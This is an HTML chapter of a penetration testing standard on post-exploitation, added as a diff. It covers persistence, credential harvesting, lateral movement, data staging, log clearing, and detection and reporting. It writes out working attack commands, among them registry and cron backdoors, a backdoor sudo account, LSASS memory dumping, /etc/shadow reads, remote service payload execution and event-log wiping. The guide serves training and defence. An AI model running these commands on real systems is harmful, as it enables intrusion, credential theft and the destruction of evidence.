@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chapter 5: Post-Exploitation - WIA Penetration Testing Standard</title>
+    <style>
+        :root {
+            --primary: #EF4444;
+            --primary-dark: #DC2626;
+            --accent: #F87171;
+            --bg: #0f172a;
+            --bg-card: #1e293b;
+            --bg-code: #011627;
+            --text: #f1f5f9;
+            --text-muted: #94a3b8;
+            --border: #334155;
+            --success: #10b981;
+            --warning: #f59e0b;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.8;
+            font-size: 17px;
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--bg-card) 0%, #1a1a2e 100%);
+            border-bottom: 1px solid var(--border);
+            padding: 15px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .header-inner {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo { display: flex; align-items: center; gap: 15px; }
+        .logo-icon { font-size: 1.8rem; }
+        .logo-text { font-weight: 700; color: var(--primary); font-size: 1.1rem; }
+        .logo-divider { color: var(--border); }
+        .logo-subtitle { color: var(--text-muted); font-size: 0.95rem; }
+
+        .chapter-nav {
+            background: var(--bg-card);
+            border-bottom: 1px solid var(--border);
+            padding: 12px 0;
+        }
+        .chapter-nav-inner {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .chapter-nav a {
+            color: var(--primary);
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+        .chapter-nav a:hover { text-decoration: underline; }
+        .chapter-indicator {
+            background: var(--bg);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 50px 20px;
+        }
+
+        .chapter-header {
+            text-align: center;
+            margin-bottom: 60px;
+            padding-bottom: 30px;
+            border-bottom: 2px solid var(--border);
+        }
+        .chapter-number {
+            color: var(--primary);
+            font-size: 1rem;
+            font-weight: 600;
+            letter-spacing: 2px;
+            margin-bottom: 15px;
+        }
+        .chapter-title {
+            font-size: 2.8rem;
+            font-weight: 800;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .chapter-subtitle {
+            font-size: 1.2rem;
+            color: var(--text-muted);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .section {
+            margin-bottom: 50px;
+        }
+        h2 {
+            font-size: 2rem;
+            margin-bottom: 25px;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        h3 {
+            font-size: 1.5rem;
+            margin: 35px 0 20px;
+            color: var(--accent);
+        }
+        p {
+            margin-bottom: 20px;
+            color: var(--text);
+        }
+
+        .info-box {
+            background: var(--bg-card);
+            border-left: 4px solid var(--primary);
+            padding: 25px;
+            margin: 30px 0;
+            border-radius: 8px;
+        }
+        .info-box h4 {
+            color: var(--primary);
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+
+        .warning-box {
+            background: rgba(239, 68, 68, 0.1);
+            border-left: 4px solid var(--primary);
+            padding: 25px;
+            margin: 30px 0;
+            border-radius: 8px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 30px 0;
+            background: var(--bg-card);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        th {
+            background: var(--primary);
+            color: white;
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+        }
+        td {
+            padding: 15px;
+            border-bottom: 1px solid var(--border);
+        }
+        tr:last-child td {
+            border-bottom: none;
+        }
+        tr:hover {
+            background: rgba(239, 68, 68, 0.05);
+        }
+
+        pre {
+            background: var(--bg-code);
+            padding: 25px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 25px 0;
+            border: 1px solid var(--border);
+        }
+        code {
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            color: var(--success);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 80px;
+            padding-top: 40px;
+            border-top: 1px solid var(--border);
+            color: var(--text-muted);
+        }
+        .footer-philosophy {
+            color: var(--primary);
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+        }
+
+        ul, ol {
+            margin: 20px 0;
+            padding-left: 30px;
+        }
+        li {
+            margin: 10px 0;
+            color: var(--text);
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-inner">
+            <div class="logo">
+                <span class="logo-icon">🎯</span>
+                <div>
+                    <span class="logo-text">WIA Penetration Testing</span>
+                    <span class="logo-divider"> | </span>
+                    <span class="logo-subtitle">Security Assessment Standard</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <a href="chapter-06.html">Next Chapter →</a>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="chapter-header">
+            <div class="chapter-number">CHAPTER 05</div>
+            <h1 class="chapter-title">Post-Exploitation</h1>
+            <p class="chapter-subtitle">Lateral movement, persistence mechanisms, and data collection strategies</p>
+        </div>
+
+        <div class="warning-box">
+            <h4>⚠️ CRITICAL DISCLAIMER</h4>
+            <p><strong>Post-exploitation techniques must ONLY be used with explicit authorization.</strong> These methods are described for educational and defensive purposes to help security teams understand attacker behavior and improve defenses.</p>
+        </div>
+
+        <div class="section">
+            <h2>🎯 Understanding Post-Exploitation</h2>
+            <p>Post-exploitation is the phase after gaining initial access where attackers expand their control, establish persistence, and achieve their ultimate objectives. Understanding these techniques is crucial for defenders to detect and prevent advanced attacks.</p>
+
+            <div class="info-box">
+                <h4>Post-Exploitation Objectives</h4>
+                <ul>
+                    <li><strong>Maintain Access:</strong> Establish persistence mechanisms</li>
+                    <li><strong>Escalate Privileges:</strong> Obtain higher-level access</li>
+                    <li><strong>Expand Reach:</strong> Move laterally to other systems</li>
+                    <li><strong>Gather Intelligence:</strong> Collect sensitive data and credentials</li>
+                    <li><strong>Cover Tracks:</strong> Remove evidence of compromise</li>
+                    <li><strong>Assess Impact:</strong> Demonstrate potential damage</li>
+                </ul>
+            </div>
+
+            <h3>The Kill Chain - Post-Exploitation Phase</h3>
+            <pre><code>CYBER KILL CHAIN (Lockheed Martin):
+
+1. Reconnaissance        ← Pre-exploitation
+2. Weaponization         ← Pre-exploitation
+3. Delivery              ← Pre-exploitation
+4. Exploitation          ← Initial access
+5. Installation          ← POST-EXPLOITATION ✓
+6. Command & Control     ← POST-EXPLOITATION ✓
+7. Actions on Objectives ← POST-EXPLOITATION ✓
+
+POST-EXPLOITATION WORKFLOW:
+
+Initial Access
+    ├── Stabilize shell/access
+    ├── Enumerate environment
+    └── Assess current privileges
+         ↓
+Privilege Escalation
+    ├── Local privilege escalation
+    ├── Credential harvesting
+    └── Token manipulation
+         ↓
+Establish Persistence
+    ├── Create backdoors
+    ├── Install implants
+    └── Modify system configs
+         ↓
+Lateral Movement
+    ├── Network reconnaissance
+    ├── Credential reuse
+    └── Exploit trust relationships
+         ↓
+Data Collection
+    ├── Identify valuable data
+    ├── Stage for exfiltration
+    └── Compress and encrypt
+         ↓
+Maintain Stealth
+    ├── Clear logs
+    ├── Disable monitoring
+    └── Use living-off-the-land techniques</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>🔄 Establishing Persistence</h2>
+            <p>Persistence mechanisms ensure continued access even after system reboots or credential changes:</p>
+
+            <h3>Windows Persistence Techniques</h3>
+            <table>
+                <tr>
+                    <th>Technique</th>
+                    <th>Method</th>
+                    <th>Detectability</th>
+                </tr>
+                <tr>
+                    <td>Registry Run Keys</td>
+                    <td>HKLM/HKCU\Software\Microsoft\Windows\CurrentVersion\Run</td>
+                    <td>Medium</td>
+                </tr>
+                <tr>
+                    <td>Scheduled Tasks</td>
+                    <td>Create task to run payload periodically</td>
+                    <td>Medium</td>
+                </tr>
+                <tr>
+                    <td>Service Creation</td>
+                    <td>Install malicious Windows service</td>
+                    <td>Medium-High</td>
+                </tr>
+                <tr>
+                    <td>WMI Event Subscription</td>
+                    <td>Create WMI event consumer</td>
+                    <td>Low</td>
+                </tr>
+                <tr>
+                    <td>DLL Hijacking</td>
+                    <td>Place malicious DLL in search path</td>
+                    <td>Low</td>
+                </tr>
+                <tr>
+                    <td>Startup Folder</td>
+                    <td>Place executable in startup directory</td>
+                    <td>High</td>
+                </tr>
+            </table>
+
+            <h4>Registry Persistence Example (Conceptual)</h4>
+            <pre><code># Add to registry run key
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
+  /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
+
+# Scheduled task creation
+schtasks /create /tn "Windows Update Check" /tr "C:\path\to\payload.exe" ^
+  /sc onlogon /ru System
+
+# WMI Event Subscription (more stealthy)
+# Creates event filter that triggers on user logon
+# Executes payload via CommandLineEventConsumer</code></pre>
+
+            <h3>Linux Persistence Techniques</h3>
+            <table>
+                <tr>
+                    <th>Technique</th>
+                    <th>Method</th>
+                    <th>Location</th>
+                </tr>
+                <tr>
+                    <td>Cron Jobs</td>
+                    <td>Schedule periodic execution</td>
+                    <td>/etc/crontab, /var/spool/cron/</td>
+                </tr>
+                <tr>
+                    <td>SSH Keys</td>
+                    <td>Add attacker's public key</td>
+                    <td>~/.ssh/authorized_keys</td>
+                </tr>
+                <tr>
+                    <td>Systemd Service</td>
+                    <td>Create malicious service</td>
+                    <td>/etc/systemd/system/</td>
+                </tr>
+                <tr>
+                    <td>RC Scripts</td>
+                    <td>Modify startup scripts</td>
+                    <td>/etc/rc.local, /etc/init.d/</td>
+                </tr>
+                <tr>
+                    <td>Bashrc/Profile</td>
+                    <td>Add commands to shell startup</td>
+                    <td>~/.bashrc, ~/.profile</td>
+                </tr>
+                <tr>
+                    <td>LD_PRELOAD</td>
+                    <td>Library injection</td>
+                    <td>/etc/ld.so.preload</td>
+                </tr>
+            </table>
+
+            <h4>Linux Persistence Examples (Conceptual)</h4>
+            <pre><code># Add SSH key for persistent access
+echo "ssh-rsa AAAA[...attacker's public key...]" >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+# Cron job (every hour)
+echo "0 * * * * /tmp/.hidden/backdoor.sh" >> /var/spool/cron/root
+
+# Systemd service
+cat > /etc/systemd/system/update-checker.service << EOF
+[Unit]
+Description=System Update Checker
+[Service]
+Type=simple
+ExecStart=/opt/scripts/checker.sh
+Restart=always
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable update-checker.service
+systemctl start update-checker.service
+
+# Backdoor user account
+useradd -M -s /bin/bash -G sudo backdoor
+echo "backdoor:P@ssw0rd123" | chpasswd</code></pre>
+
+            <div class="warning-box">
+                <h4>⚠️ Testing Guidelines</h4>
+                <p>When testing persistence mechanisms:</p>
+                <ul>
+                    <li>Document all persistence mechanisms created</li>
+                    <li>Ensure complete removal during cleanup</li>
+                    <li>Verify with client before creating backdoor accounts</li>
+                    <li>Use distinctive names for easy identification</li>
+                    <li>Never use techniques that could harm system stability</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>🔐 Credential Harvesting</h2>
+            <p>Collecting credentials is often the key to lateral movement and privilege escalation:</p>
+
+            <h3>Windows Credential Extraction</h3>
+            <table>
+                <tr>
+                    <th>Tool/Method</th>
+                    <th>Targets</th>
+                    <th>Requirements</th>
+                </tr>
+                <tr>
+                    <td>Mimikatz</td>
+                    <td>LSASS memory, SAM, cached credentials</td>
+                    <td>Administrator/SYSTEM access</td>
+                </tr>
+                <tr>
+                    <td>LSASS Dump</td>
+                    <td>Process memory containing credentials</td>
+                    <td>Administrator access</td>
+                </tr>
+                <tr>
+                    <td>SAM Database</td>
+                    <td>Local password hashes</td>
+                    <td>SYSTEM access</td>
+                </tr>
+                <tr>
+                    <td>NTDS.dit</td>
+                    <td>Active Directory database</td>
+                    <td>Domain Controller access</td>
+                </tr>
+                <tr>
+                    <td>Credential Manager</td>
+                    <td>Saved credentials</td>
+                    <td>User context</td>
+                </tr>
+                <tr>
+                    <td>Browser Passwords</td>
+                    <td>Saved browser credentials</td>
+                    <td>User context</td>
+                </tr>
+            </table>
+
+            <h4>Credential Harvesting Concepts</h4>
+            <pre><code># LSASS memory dump (requires admin)
+# Creates dump file of LSASS process memory
+# Can be analyzed offline with Mimikatz
+
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump ^
+  [LSASS_PID] C:\temp\lsass.dmp full
+
+# Extract from Credential Manager
+cmdkey /list
+
+# PowerShell credential extraction
+# (Requires appropriate privileges)
+Get-WmiObject -Class Win32_Process -Filter "Name='lsass.exe'"
+
+# Note: These techniques require proper authorization
+# and should only be used in approved security assessments</code></pre>
+
+            <h3>Linux Credential Harvesting</h3>
+            <pre><code># Password hash extraction
+cat /etc/shadow              # Requires root access
+
+# SSH private keys
+find / -name id_rsa 2>/dev/null
+find / -name id_dsa 2>/dev/null
+
+# Bash history (may contain passwords)
+cat ~/.bash_history
+cat /home/*/.bash_history
+
+# Configuration files with credentials
+grep -r "password" /etc/ 2>/dev/null
+find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
+
+# Environment variables
+env | grep -i pass
+cat /proc/*/environ | tr '\0' '\n' | grep -i pass
+
+# Database credentials
+cat /var/www/html/config.php
+cat /etc/mysql/my.cnf</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>↔️ Lateral Movement</h2>
+            <p>Moving from the initially compromised system to other systems in the network:</p>
+
+            <h3>Lateral Movement Techniques</h3>
+            <table>
+                <tr>
+                    <th>Technique</th>
+                    <th>Description</th>
+                    <th>Tools</th>
+                </tr>
+                <tr>
+                    <td>Pass-the-Hash</td>
+                    <td>Use NTLM hash without knowing plaintext password</td>
+                    <td>Mimikatz, CrackMapExec, Impacket</td>
+                </tr>
+                <tr>
+                    <td>Pass-the-Ticket</td>
+                    <td>Use Kerberos tickets for authentication</td>
+                    <td>Mimikatz, Rubeus</td>
+                </tr>
+                <tr>
+                    <td>RDP Hijacking</td>
+                    <td>Attach to existing RDP sessions</td>
+                    <td>Built-in Windows tools</td>
+                </tr>
+                <tr>
+                    <td>PSExec</td>
+                    <td>Execute commands on remote systems</td>
+                    <td>PsExec, Impacket, Metasploit</td>
+                </tr>
+                <tr>
+                    <td>WMI</td>
+                    <td>Windows Management Instrumentation</td>
+                    <td>wmic, PowerShell, CrackMapExec</td>
+                </tr>
+                <tr>
+                    <td>PowerShell Remoting</td>
+                    <td>Remote PowerShell execution</td>
+                    <td>PowerShell, Evil-WinRM</td>
+                </tr>
+            </table>
+
+            <h4>Lateral Movement Examples (Conceptual)</h4>
+            <pre><code># PSExec execution
+psexec.py domain/user:password@target.com "whoami"
+
+# WMI command execution
+wmic /node:target.com /user:domain\user /password:pass ^
+  process call create "cmd.exe /c commands"
+
+# PowerShell remoting
+Enter-PSSession -ComputerName target.com -Credential domain\user
+
+# SMB file copy and execution
+copy payload.exe \\target\C$\Windows\Temp\
+sc \\target create backdoor binpath= "C:\Windows\Temp\payload.exe"
+sc \\target start backdoor
+
+# Pass-the-Hash concept
+# Using NTLM hash instead of password
+# Requires appropriate tools and privileges</code></pre>
+
+            <h3>Active Directory Exploitation</h3>
+            <div class="info-box">
+                <h4>Common AD Attack Paths</h4>
+                <ul>
+                    <li><strong>Kerberoasting:</strong> Request service tickets and crack offline</li>
+                    <li><strong>AS-REP Roasting:</strong> Target accounts without Kerberos pre-auth</li>
+                    <li><strong>Golden Ticket:</strong> Forge TGT with KRBTGT hash</li>
+                    <li><strong>Silver Ticket:</strong> Forge service tickets</li>
+                    <li><strong>DCSync:</strong> Replicate domain credentials from DC</li>
+                    <li><strong>LLMNR/NBT-NS Poisoning:</strong> Intercept authentication attempts</li>
+                </ul>
+            </div>
+
+            <pre><code># AD Reconnaissance
+# Enumerate domain users, groups, computers
+
+# BloodHound - Visualize AD attack paths
+# Identifies shortest path to Domain Admin
+
+# Find Domain Admins
+net group "Domain Admins" /domain
+
+# Find Domain Controllers
+nltest /dclist:domain.com
+
+# Enumerate trusts
+nltest /domain_trusts</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>📦 Data Collection and Staging</h2>
+            <p>Identifying, collecting, and preparing sensitive data for demonstration purposes:</p>
+
+            <h3>Data Discovery</h3>
+            <table>
+                <tr>
+                    <th>Data Type</th>
+                    <th>Search Strategy</th>
+                    <th>Example Locations</th>
+                </tr>
+                <tr>
+                    <td>Credentials</td>
+                    <td>Search for password files, configs</td>
+                    <td>Config files, scripts, documents</td>
+                </tr>
+                <tr>
+                    <td>Intellectual Property</td>
+                    <td>Look for proprietary documents</td>
+                    <td>File servers, SharePoint, email</td>
+                </tr>
+                <tr>
+                    <td>Personal Data (PII)</td>
+                    <td>Database queries, file searches</td>
+                    <td>Databases, CRM systems, HR files</td>
+                </tr>
+                <tr>
+                    <td>Financial Data</td>
+                    <td>Target accounting systems</td>
+                    <td>Financial databases, spreadsheets</td>
+                </tr>
+                <tr>
+                    <td>Source Code</td>
+                    <td>Git repositories, dev servers</td>
+                    <td>Version control, development systems</td>
+                </tr>
+            </table>
+
+            <h4>Data Search Commands</h4>
+            <pre><code># Windows file search
+dir /s /b C:\*password*.txt
+dir /s /b C:\*confidential*.*
+dir /s /b C:\*.xlsx | findstr /i "finance salary budget"
+
+# PowerShell recursive search
+Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.doc,*.xlsx ^
+  | Select-String -Pattern "password|confidential|secret"
+
+# Linux file search
+find / -name "*password*" 2>/dev/null
+find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
+locate credentials.txt
+
+# Database queries (example)
+SELECT * FROM users WHERE role = 'admin';
+SELECT table_name FROM information_schema.tables;</code></pre>
+
+            <h3>Data Staging and Preparation</h3>
+            <pre><code># Create staging directory
+mkdir C:\Windows\Temp\.staging
+
+# Copy interesting files
+xcopy C:\Users\*\Documents\*.xlsx C:\Windows\Temp\.staging /s
+
+# Compress data
+tar -czf collected_data.tar.gz /path/to/data
+# or on Windows:
+Compress-Archive -Path .\staging\* -DestinationPath collected.zip
+
+# Encrypt (if needed)
+# Use appropriate encryption tools
+# GPG, 7zip with password, etc.</code></pre>
+
+            <div class="warning-box">
+                <h4>⚠️ Data Handling Ethics</h4>
+                <p><strong>CRITICAL:</strong> During authorized penetration tests:</p>
+                <ul>
+                    <li>Only collect minimal data needed to prove impact</li>
+                    <li>Never exfiltrate actual sensitive data</li>
+                    <li>Use file hashes or screenshots as evidence</li>
+                    <li>Immediately delete any accidentally collected PII</li>
+                    <li>Report data exposure risks to client immediately</li>
+                    <li>Treat all client data as highly confidential</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>🔇 Covering Tracks</h2>
+            <p>Understanding how attackers hide their activities helps defenders know what to look for:</p>
+
+            <h3>Log Manipulation</h3>
+            <table>
+                <tr>
+                    <th>Platform</th>
+                    <th>Log Location</th>
+                    <th>Clearing Method</th>
+                </tr>
+                <tr>
+                    <td>Windows Event Logs</td>
+                    <td>C:\Windows\System32\winevt\Logs\</td>
+                    <td>wevtutil cl System/Security/Application</td>
+                </tr>
+                <tr>
+                    <td>Linux Syslog</td>
+                    <td>/var/log/syslog, /var/log/messages</td>
+                    <td>Selective deletion, log rotation</td>
+                </tr>
+                <tr>
+                    <td>Linux Auth Log</td>
+                    <td>/var/log/auth.log, /var/log/secure</td>
+                    <td>sed, awk to remove entries</td>
+                </tr>
+                <tr>
+                    <td>Web Server Logs</td>
+                    <td>/var/log/apache2/, /var/log/nginx/</td>
+                    <td>Delete or modify access logs</td>
+                </tr>
+                <tr>
+                    <td>Bash History</td>
+                    <td>~/.bash_history</td>
+                    <td>Clear or disable history</td>
+                </tr>
+            </table>
+
+            <h4>Track Covering Techniques (For Detection)</h4>
+            <pre><code># Windows - Clear event logs
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application
+
+# Linux - Disable command history
+unset HISTFILE
+export HISTSIZE=0
+
+# Clear bash history
+cat /dev/null > ~/.bash_history
+history -c
+
+# Remove specific entries
+history -d [line_number]
+
+# Timestomp (change file timestamps)
+# Modify MAC (Modified, Accessed, Created) times
+# Makes files appear older or not recently accessed
+
+# Note: Modern logging and SIEM systems
+# make complete track covering very difficult
+# Defenders should implement:
+# - Centralized logging
+# - Log integrity monitoring
+# - Immutable log storage
+# - Real-time alerting</code></pre>
+
+            <h3>Anti-Forensics Awareness</h3>
+            <div class="info-box">
+                <h4>Defender's Perspective</h4>
+                <p>Understanding track-covering helps implement better detection:</p>
+                <ul>
+                    <li>Forward logs to SIEM in real-time</li>
+                    <li>Implement file integrity monitoring (FIM)</li>
+                    <li>Use write-once log storage</li>
+                    <li>Monitor for log clearing events</li>
+                    <li>Baseline normal administrative behavior</li>
+                    <li>Alert on unusual log gaps or deletions</li>
+                    <li>Maintain offline backups of critical logs</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>🛡️ Defense and Detection</h2>
+
+            <h3>Detecting Post-Exploitation Activity</h3>
+            <table>
+                <tr>
+                    <th>Activity</th>
+                    <th>Detection Indicators</th>
+                    <th>Mitigation</th>
+                </tr>
+                <tr>
+                    <td>Persistence</td>
+                    <td>
+                        • New scheduled tasks<br>
+                        • Registry run key modifications<br>
+                        • New services created<br>
+                        • Startup folder changes
+                    </td>
+                    <td>
+                        • Autoruns monitoring<br>
+                        • Registry auditing<br>
+                        • Service baseline<br>
+                        • Application whitelisting
+                    </td>
+                </tr>
+                <tr>
+                    <td>Credential Theft</td>
+                    <td>
+                        • LSASS access<br>
+                        • Mimikatz signatures<br>
+                        • SAM database access<br>
+                        • Unusual credential dumps
+                    </td>
+                    <td>
+                        • Credential Guard<br>
+                        • Protected Process Light<br>
+                        • Privileged Access Workstations<br>
+                        • Multi-factor authentication
+                    </td>
+                </tr>
+                <tr>
+                    <td>Lateral Movement</td>
+                    <td>
+                        • Unusual RDP connections<br>
+                        • PSExec usage<br>
+                        • WMI remote execution<br>
+                        • Abnormal SMB traffic
+                    </td>
+                    <td>
+                        • Network segmentation<br>
+                        • Just-in-time admin access<br>
+                        • Lateral movement detection tools<br>
+                        • Privileged access management
+                    </td>
+                </tr>
+            </table>
+
+            <h3>MITRE ATT&CK Framework</h3>
+            <p>Post-exploitation techniques mapped to MITRE ATT&CK:</p>
+            <pre><code>TACTICS (Columns):
+├── Persistence (TA0003)
+├── Privilege Escalation (TA0004)
+├── Defense Evasion (TA0005)
+├── Credential Access (TA0006)
+├── Discovery (TA0007)
+├── Lateral Movement (TA0008)
+├── Collection (TA0009)
+└── Exfiltration (TA0010)
+
+TECHNIQUES (Examples):
+├── T1053: Scheduled Task/Job
+├── T1136: Create Account
+├── T1003: OS Credential Dumping
+├── T1021: Remote Services
+├── T1070: Indicator Removal on Host
+└── T1560: Archive Collected Data
+
+Use ATT&CK Navigator to:
+- Map discovered techniques
+- Plan defenses
+- Prioritize detection rules</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>📊 Post-Exploitation Reporting</h2>
+            <p>Documenting post-exploitation findings effectively:</p>
+
+            <h3>Key Report Elements</h3>
+            <ul>
+                <li><strong>Access Level Achieved:</strong> Initial and escalated privileges</li>
+                <li><strong>Persistence Mechanisms:</strong> Methods that could allow return access</li>
+                <li><strong>Lateral Movement:</strong> Systems accessed beyond initial compromise</li>
+                <li><strong>Data Accessed:</strong> Types and sensitivity of accessible data</li>
+                <li><strong>Detection Evasion:</strong> Which security controls were bypassed</li>
+                <li><strong>Business Impact:</strong> Real-world consequences of the access</li>
+                <li><strong>Remediation Steps:</strong> Specific actions to prevent recurrence</li>
+            </ul>
+
+            <div class="info-box">
+                <h4>Evidence Collection Best Practices</h4>
+                <ul>
+                    <li>Screenshot command outputs with timestamps</li>
+                    <li>Document every step of the attack path</li>
+                    <li>Collect file hashes instead of actual files when possible</li>
+                    <li>Note detection/prevention tools encountered</li>
+                    <li>Record cleanup activities performed</li>
+                    <li>Maintain chain of custody for evidence</li>
+                </ul>
+            </div>
+        </div>
+
+        <p>© 2025 WIA (World Certification Industry Association)</p>
+            <p>Educational material for defensive security purposes only</p>
+        </div>
+    </div>
+</body>
+</html>
